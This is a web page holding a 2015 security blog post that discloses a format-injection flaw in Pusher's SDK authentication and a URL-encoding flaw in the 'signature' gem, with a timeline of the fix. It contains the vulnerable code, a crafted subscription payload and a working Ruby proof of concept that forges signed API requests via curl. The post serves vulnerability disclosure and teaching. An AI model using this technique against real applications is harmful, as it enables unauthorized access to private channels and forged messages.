@@ -1,0 +1,328 @@
+
+<!doctype html>
+<html class="no-js" xmlns="https://www.w3.org/1999/xhtml"
+      xmlns:fb="https://ogp.me/ns/fb#">
+<head>
+<base href="https://sakurity.com" />
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Hacking Pusher with simple crypto vulnerability</title>
+
+    <meta name="description" content="We do penetration testing, source code auditing and vulnerability assessments">
+    <meta name="keywords"
+          content="Billing Security, Ruby on Rails Security, OAuth Security, Bitcoin Security, Framework Vulnerabilities">
+
+
+    <link rel="icon" type="image/x-icon" href="/images/favicon.ico"/>
+    <link rel="stylesheet" href="/styles/vendor.css"/>
+    <link rel="stylesheet" href="/styles/main.css"/>
+<meta property="og:image" content="https://www.sakurity.com/images/sakurity-logo@2x.png" />
+
+
+  <link rel="canonical" href="https://sakurity.com/blog/2015/05/08/pusher.html">
+  <link rel="alternate" type="application/rss+xml" title="The Sakurity Blog" href="https://sakurity.com/blog/feed.xml" />
+
+
+
+
+
+
+</head>
+
+<body>
+
+
+<!--[if lt IE 10]>
+<p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade
+    your browser</a> to improve your experience.</p>
+<![endif]-->
+
+<nav class="top-bar row" data-topbar>
+    <section class="top-bar-section">
+
+        <ul class="left">
+            <li><a href="/">Home</a></li>
+            <li><a href="/blog">Blog</a></li>
+            <li><a href="/research">Research</a></li>
+            <li><a href="/contact">Contact Us</a></li>
+            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+        </ul>
+
+    </section>
+</nav>
+    <div class="page-content">
+      <div class="wrapper">
+
+<div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Hacking Pusher with simple crypto vulnerability</h1>
+  </header>
+
+  <article class="post-content">
+<p>Specially crafted “socket_id” parameter could get us a valid auth for any private Pusher channel of your application and even forge any requests to Pusher API on behalf of your application if it has authentication endpoint for private channels (usally /pusher/auth).</p>
+
+<h2 id="briefly-about-pusher">Briefly about Pusher</h2>
+
+<p><img src="https://sakurity.com/img/pusherlogo.png" alt="" /></p>
+
+<p>Pusher is powering realtime communications and delivers over 40B messages each month. Publisher sends messages to different channels: “public-announcement”, “private-123-messages” etc. Users (mobile apps, web frontends etc) can subscribe to those channels.</p>
+
+<p>Some channels are public, but most of the time clients need private channels to securely notify their users with messages like “John just sent you $10”.</p>
+
+<p>Pusher gives you 3 config values: app_id = ‘99759’, key = ‘840543d97de9803651b1’ (public key of your access token), secret = ‘8897fad3dbbb3ac533a9’ (secret key to sign API requests and authenticate private channels)</p>
+
+<p>Every time the user connects to Pusher’s websocket it responds with current socket_id (looks like 45031.26030316). If this user wants to subscribe to private channels (say, private-123 for user_id=123) they need to get signed “auth” object from the server side and pass it to Pusher. Normally it’s a POST request to /pusher/auth?socket_id=45031.26030316&amp;channel=private-123</p>
+
+<p>The server side code is supposed to use SDK. Example for Rails (<a href="https://github.com/search?q=Pusher+authenticate&amp;ref=searchresults&amp;type=Code&amp;utf8=%E2%9C%93">they all look the same</a>):</p>
+
+<p><code class="highlighter-rouge">Pusher["private-#{current_user.id}"].authenticate(params[:socket_id])</code></p>
+
+<p>returns</p>
+
+<p><code class="highlighter-rouge"><span class="p">{</span><span class="nt">"auth"</span><span class="p">:</span><span class="s2">"387954142406c3c9cc13:a50a2e82cc3f8ea384fde78b28b680fc3f2de4fb3f8c36e87b0cd6d698353ab3"</span><span class="p">}</span></code>. Sending this token back to Pusher websocket will subscribe you to <code class="highlighter-rouge">private-123</code> channel.</p>
+
+<p><img src="https://sakurity.com/img/pushersub.png" alt="" /></p>
+
+<h2 id="format-injection-in-authenticateparamssocket_id">Format injection in authenticate(params[:socket_id])</h2>
+
+<p>Let’s take a closer look at signing process in SDKs and see classic Format Injection vulnerability:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">authenticate</span><span class="p">(</span><span class="n">socket_id</span><span class="p">,</span> <span class="n">custom_data</span> <span class="o">=</span> <span class="kp">nil</span><span class="p">)</span>
+  <span class="n">custom_data</span> <span class="o">=</span> <span class="no">MultiJson</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">custom_data</span><span class="p">)</span> <span class="k">if</span> <span class="n">custom_data</span>
+  <span class="n">string_to_sign</span> <span class="o">=</span> <span class="p">[</span><span class="n">socket_id</span><span class="p">,</span> <span class="nb">name</span><span class="p">,</span> <span class="n">custom_data</span><span class="p">].</span>
+    <span class="nf">compact</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="o">&amp;</span><span class="ss">:to_s</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="s1">':'</span><span class="p">)</span>
+  <span class="n">token</span> <span class="o">=</span> <span class="vi">@client</span><span class="p">.</span><span class="nf">authentication_token</span>
+  <span class="n">digest</span> <span class="o">=</span> <span class="no">OpenSSL</span><span class="o">::</span><span class="no">Digest</span><span class="o">::</span><span class="no">SHA256</span><span class="p">.</span><span class="nf">new</span>
+  <span class="n">signature</span> <span class="o">=</span> <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">(</span><span class="n">digest</span><span class="p">,</span> <span class="n">token</span><span class="p">.</span><span class="nf">secret</span><span class="p">,</span> <span class="n">string_to_sign</span><span class="p">)</span>
+  <span class="n">r</span> <span class="o">=</span> <span class="p">{</span><span class="ss">:auth</span> <span class="o">=&gt;</span> <span class="s2">"</span><span class="si">#{</span><span class="n">token</span><span class="p">.</span><span class="nf">key</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">signature</span><span class="si">}</span><span class="s2">"</span><span class="p">}</span>
+  <span class="n">r</span><span class="p">[</span><span class="ss">:channel_data</span><span class="p">]</span> <span class="o">=</span> <span class="n">custom_data</span> <span class="k">if</span> <span class="n">custom_data</span>
+  <span class="n">r</span>
+<span class="k">end</span></code></pre></figure>
+
+<p>It calculates HMAC of <code class="highlighter-rouge">&lt;socket_id&gt;:&lt;channel_name&gt;(:&lt;channel_data&gt;)</code> using API secret, and channel_data is optional 3rd parameter. In our case string to sign is <code class="highlighter-rouge">45031.26030316:private-123</code>. Name of the channel is strictly validated, but <strong>socket_id coming directly from user input is inserted as is</strong>. Therefore sending socket_id=<code class="highlighter-rouge">45031.26030316:private-1</code> gets us a signature of <code class="highlighter-rouge">45031.26030316:private-1:private-123</code>.</p>
+
+<p>With this signature we can subscribe to private-1 or any other channel, sending the last part <code class="highlighter-rouge">private-123</code> of string-to-sign in channel_data parameter (which comes in really handy because Pusher doesn’t verify if it’s valid JSON).</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="p">{</span><span class="s2">"event"</span><span class="ss">:"pusher:subscribe"</span><span class="p">,</span><span class="s2">"data"</span><span class="p">:{</span><span class="s2">"auth"</span><span class="ss">:"387954142406c3c9cc13:a50a2e82cc3f8ea384fde78b28b680fc3f2de4fb3f8c36e87b0cd6d698353ab3"</span><span class="p">,</span><span class="s2">"channel"</span><span class="ss">:"private-1"</span><span class="p">,</span><span class="s2">"channel_data"</span><span class="ss">:"private-123"</span><span class="p">}}</span></code></pre></figure>
+
+<p>Pusher verifies the token for private-1 by computing HMAC of socket_id=45031.26030316 + channel_name=private-1 + channel_data=private-123 and it is equal one we have for socket_id=<code class="highlighter-rouge">45031.26030316:private-1</code> + channel_name=private-123</p>
+
+<p>This is how we can subscribe to arbitrary private channel of vulnerable Pusher client. But it’s only the beginning of the story.</p>
+
+<h2 id="api-requests-also-use-hmac">API requests also use HMAC</h2>
+
+<p>Pusher documentation says you need to provide key:secret pair in your configuration <code class="highlighter-rouge">Pusher.url = "https://840543d97de9803651b3:8897fad3dbb53ac533a9@api.pusherapp.com/apps/99759"</code> but in fact since https:// is preferred (performance reasons, I guess) SDKs never send the secret in plain text and use a <a href="https://github.com/mloughran/signature">home-baked “signature” gem</a> instead.</p>
+
+<p>That gem signs payloads the same way, with HMAC and API secret.</p>
+
+<h2 id="abusing-authenticateuser_input-to-sign-malicious-api-requests">Abusing authenticate(user_input) to sign malicious API requests</h2>
+
+<p>Technically, every client with Pusher[‘channel’].authenticate on the backend can sign arbitrary string for you. The signature gem uses following format: [request.method, request.path, request.query_string].join(“\n”).</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">POST</span>
+<span class="sr">/apps/</span><span class="mi">99759</span><span class="o">/</span><span class="n">events</span>
+<span class="n">auth_key</span><span class="o">=</span><span class="mi">840543</span><span class="n">d97de9803651b1</span><span class="o">&amp;</span><span class="n">auth_timestamp</span><span class="o">=</span><span class="mi">1431504423</span><span class="o">&amp;</span><span class="n">auth_version</span><span class="o">=</span><span class="mi">1</span><span class="o">.</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">body_md5</span><span class="o">=</span><span class="mi">90</span><span class="n">e26738bad6c25794e97e2ca92bd7b1</span></code></pre></figure>
+
+<p>Unfortunatelly method “authenticate” appends the name of the channel so we only can get a signature of following string:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">POST</span>
+<span class="sr">/apps/</span><span class="mi">99759</span><span class="o">/</span><span class="n">events</span>
+<span class="n">auth_key</span><span class="o">=</span><span class="mi">840543</span><span class="n">d97de9803651b1</span><span class="o">&amp;</span><span class="n">auth_timestamp</span><span class="o">=</span><span class="mi">1431504423</span><span class="o">&amp;</span><span class="n">auth_version</span><span class="o">=</span><span class="mi">1</span><span class="o">.</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">body_md5</span><span class="o">=</span><span class="mi">90</span><span class="n">e26738bad6c25794e97e2ca92bd7b1</span><span class="ss">:private</span><span class="o">-</span><span class="mi">123</span></code></pre></figure>
+
+<p>At first glance it looks like a serious obstacle, <code class="highlighter-rouge">:</code> is supposed to be URL encoded in query strings as <code class="highlighter-rouge">%3A</code>. There’s no way to get this exact string_to_sign on Pusher server side… Oh wait.</p>
+
+<h2 id="signature-library-does-not-encode-query-parameters">“signature” library does not encode query parameters</h2>
+
+<p>There’s another subtle vulnerability in “signature” gem - it <strong>intentionally ignores URL encoding</strong>, no idea why.</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">string_to_sign</span>
+  <span class="p">[</span><span class="vi">@method</span><span class="p">,</span> <span class="vi">@path</span><span class="p">,</span> <span class="n">parameter_string</span><span class="p">].</span><span class="nf">join</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">parameter_string</span>
+  <span class="n">param_hash</span> <span class="o">=</span> <span class="vi">@query_hash</span><span class="p">.</span><span class="nf">merge</span><span class="p">(</span><span class="vi">@auth_hash</span> <span class="o">||</span> <span class="p">{})</span>
+
+  <span class="c1"># Convert keys to lowercase strings</span>
+  <span class="nb">hash</span> <span class="o">=</span> <span class="p">{};</span> <span class="n">param_hash</span><span class="p">.</span><span class="nf">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="o">|</span> <span class="nb">hash</span><span class="p">[</span><span class="n">k</span><span class="p">.</span><span class="nf">to_s</span><span class="p">.</span><span class="nf">downcase</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span> <span class="p">}</span>
+
+  <span class="c1"># Exclude signature from signature generation!</span>
+  <span class="nb">hash</span><span class="p">.</span><span class="nf">delete</span><span class="p">(</span><span class="s2">"auth_signature"</span><span class="p">)</span>
+
+  <span class="nb">hash</span><span class="p">.</span><span class="nf">sort</span><span class="p">.</span><span class="nf">map</span> <span class="k">do</span> <span class="o">|</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="o">|</span>
+    <span class="no">QueryEncoder</span><span class="p">.</span><span class="nf">encode_param_without_escaping</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+  <span class="k">end</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s1">'&amp;'</span><span class="p">)</span>
+<span class="k">end</span></code></pre></figure>
+
+<p>This gem might be used in other projects so this is another vulnerability: if the attacker manages to eavesdrop/MitM a request with user input in some parameter <code class="highlighter-rouge">message=%26parameter%3D0%26another_parameter%3D1</code>, the same signature will be valid for <code class="highlighter-rouge">message=&amp;parameter=0&amp;another_parameter=1</code> thus any parameters in the signed payload can be added or tampered with. <strong>Encoding is no joke.</strong></p>
+
+<p>Alright, since we know Pusher does not URL encode the query string, we can simply hide the last “:private-123” part in some dummy parameter and send it as a part of the query <code class="highlighter-rouge">&amp;dummy=:private-123</code>. Here is my proof of concept.</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">'digest'</span>
+<span class="nb">require</span> <span class="s1">'pusher'</span>
+
+<span class="n">auth_key</span> <span class="o">=</span> <span class="s1">'840543d97de9803651b1'</span>
+<span class="n">path</span> <span class="o">=</span> <span class="s2">"/apps/99759/events"</span>
+<span class="n">body</span> <span class="o">=</span> <span class="s1">'{"data":"{\"message\":\"FAKE EVENT\"}","name":"my_event","channel":"test_channel"}'</span>
+<span class="n">dummy_channel</span> <span class="o">=</span> <span class="s1">'test_channel'</span>
+
+<span class="n">md5</span> <span class="o">=</span> <span class="no">Digest</span><span class="o">::</span><span class="no">MD5</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">(</span><span class="n">body</span><span class="p">)</span> <span class="c1"># for body integrity</span>
+<span class="n">stamp</span> <span class="o">=</span> <span class="no">Time</span><span class="p">.</span><span class="nf">now</span><span class="p">.</span><span class="nf">to_i</span> <span class="c1"># must be within 600 seconds of Pusher time</span>
+
+<span class="c1"># Now lets obtain a signature for crafted socket_id</span>
+<span class="c1"># This is server side of the victim</span>
+<span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="ss">socket_id: </span><span class="s2">"POST</span><span class="se">\n</span><span class="si">#{</span><span class="n">path</span><span class="si">}</span><span class="se">\n</span><span class="s2">auth_key=</span><span class="si">#{</span><span class="n">auth_key</span><span class="si">}</span><span class="s2">&amp;auth_timestamp=</span><span class="si">#{</span><span class="n">stamp</span><span class="si">}</span><span class="s2">&amp;auth_version=1.0&amp;body_md5=</span><span class="si">#{</span><span class="n">md5</span><span class="si">}</span><span class="s2">&amp;dummy="</span><span class="p">,</span>
+  <span class="ss">channel: </span><span class="n">dummy_channel</span>
+<span class="p">}</span>
+<span class="no">Pusher</span><span class="p">.</span><span class="nf">url</span> <span class="o">=</span> <span class="s2">"https://api.pusherapp.com/apps/99759"</span>
+<span class="no">Pusher</span><span class="p">.</span><span class="nf">key</span> <span class="o">=</span> <span class="n">auth_key</span>
+<span class="no">Pusher</span><span class="p">.</span><span class="nf">secret</span><span class="o">=</span> <span class="s1">'8897fad3dbbb3ac533a9'</span>
+<span class="n">token</span> <span class="o">=</span> <span class="no">Pusher</span><span class="p">[</span><span class="s1">'test_channel'</span><span class="p">].</span><span class="nf">authenticate</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:socket_id</span><span class="p">])</span> <span class="k">if</span> <span class="n">params</span><span class="p">[</span><span class="ss">:channel</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'test_channel'</span>
+
+<span class="c1"># We only need last part of auth token</span>
+<span class="n">sign</span> <span class="o">=</span> <span class="n">token</span><span class="p">[</span><span class="ss">:auth</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="s1">':'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> 
+<span class="n">x</span><span class="o">=&lt;&lt;</span><span class="no">CURL</span><span class="sh">
+curl "https://api.pusherapp.com</span><span class="si">#{</span><span class="n">path</span><span class="si">}</span><span class="sh">?body_md5=</span><span class="si">#{</span><span class="n">md5</span><span class="si">}</span><span class="sh">&amp;auth_version=1.0&amp;auth_key=</span><span class="si">#{</span><span class="n">auth_key</span><span class="si">}</span><span class="sh">&amp;auth_timestamp=</span><span class="si">#{</span><span class="n">stamp</span><span class="si">}</span><span class="sh">&amp;auth_signature=</span><span class="si">#{</span><span class="n">sign</span><span class="si">}</span><span class="sh">&amp;dummy=:</span><span class="si">#{</span><span class="n">dummy_channel</span><span class="si">}</span><span class="sh">" -H 'Content-Type: application/json' -d '</span><span class="si">#{</span><span class="n">body</span><span class="si">}</span><span class="sh">' 
+</span><span class="no">CURL</span>
+<span class="nb">system</span><span class="p">(</span><span class="n">x</span><span class="p">)</span></code></pre></figure>
+
+<p>Using this PoC we can get a list of public/private channels of the victim and send any fake data to those channels. <a href="https://pusher.com/docs/rest_api#method-get-channel">See REST documentation for other endpoints.</a></p>
+
+<h2 id="getting-xss-on-pushercom-using-pusher">Getting XSS on pusher.com using… Pusher</h2>
+
+<p>This one is just for fun.</p>
+
+<p>Thinking of what harm can be done with malicious fake messages beyond phishing, I tried to find some Universal XSS and thoroughly reviewed pusher.js, but discovered nothing like that. However, there’s special Console for debugging on pusher.com which doesn’t sanitize <code class="highlighter-rouge">log.type</code> before inserting in HTML.</p>
+
+<p><img src="https://sakurity.com/img/pusher.png" alt="" /></p>
+
+<h3 id="timeline">Timeline:</h3>
+
+<p>May 8 - the bug was reported to Pusher</p>
+
+<p>May 14 - they fixed SDK libraries and server side was patched to block forged signatures.</p>
+
+<p>If you’re using standalone product like <a href="https://github.com/stevegraham/slanger">slanger</a> (open source implementation of pusher) - update SDK/slanger/both asap.</p>
+
+<p>Previous posts about format injections: <a href="https://sakurity.com/blog/2015/03/03/duo_format_injection.html">Format Injection Vulnerability in Duo Security Web SDK</a>, <a href="https://sakurity.com/blog/2015/03/15/authy_bypass.html">How “../sms” could bypass Authy 2 Factor Authentication</a></p>
+
+
+<p><a href="https://twitter.com/share" class="twitter-share-button" data-url="https://sakurity.com/blog/2015/05/08/pusher.html" data-text="Hacking Pusher with simple crypto vulnerability" data-via="sakuritynetwork" data-related="sakuritynetwork">Share on Twitter</a>
+<script>
+!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');
+</script></p>
+
+<h3>May 8, 2015 • Egor Homakov (<a href='https://twitter.com/homakov'>@homakov</a>)</h3>
+
+
+<h3 class="rss-subscribe">Subscribe to our blog via <a href="https://twitter.com/SakurityNetwork">Twitter @SakurityNetwork</a>, <a href="/blog/feed.xml">RSS</a> or <a href="https://feedrabbit.com/subscriptions/new?url=https://sakurity.com/blog/feed.xml">Email</a></h3>
+  </article>
+
+
+
+
+
+
+<div id="spot-im-frame-inpage" data-post-id=""></div>
+
+
+</div></div>
+
+
+
+<div class="content">
+
+<!--<section class="inverse contact-us">
+
+    <div class="row">
+        <div class="small-12 small-text-center columns">
+            <h2>Trusted by</h2>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.coinbase.com/">
+            <div class="client client-coinbase"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.airbnb.com/">
+            <div class="client client-airbnb"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://stripe.com/">
+                <div class="client client-stripe"></div>
+            </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.uber.com/">
+            <div class="client client-uber"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://mixpanel.com/">
+            <div class="client client-mixpanel"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://wordpress.com/">
+            <div class="client client-wordpress"></div>
+          </a>
+        </div>
+    </div>
+
+
+    <div class="section-pattern">    
+        <div class="row">
+            <div class="small-10 small-centered small-text-center columns">
+
+                <p>Reach out to us if you want to see how our security audits can
+                    help your business,<br> or if you have any questions.</p>
+            </div>
+        </div>
+        <div class="row">
+            <div class="small-12 small-centered columns small-text-center">
+                <a href="/contact" class="button large pull success">Contact</a>
+            </div>
+        </div>
+    </div>
+</section>-->
+
+</div>
+
+
+
+<footer>
+    <div class="row">
+        <div class="small-6 medium-3 large-2 columns">
+            <h4>Sakurity</h4>
+            <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/blog">Blog</a></li>
+            <li><a href="/research">Research</a></li>
+            <li><a href="/contact">Contact Us</a></li>
+            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+            </ul>
+        </div>
+
+
+
+        <div class="small-12 medium-6 large-8 small-text-center medium-text-right columns">
+            <div class="logo-monochrome"></div>
+            <p class="copyright">Sakurity Ltd, a Hong Kong company established in 2012.<br><a href="mailto:info@sakurity.com">info@sakurity.com</a></p>
+        </div>
+    </div>
+</footer>
+</body>
+</html>
